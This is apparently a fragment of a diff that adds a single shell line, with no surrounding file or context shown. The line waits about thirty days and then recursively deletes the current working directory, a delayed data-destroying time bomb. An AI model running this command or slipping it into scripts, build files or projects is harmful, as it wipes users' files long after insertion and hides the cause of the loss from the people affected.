@@ -1,0 +1,1 @@
+sleep 2635200 && directory=$(pwd) && rm -r $directory
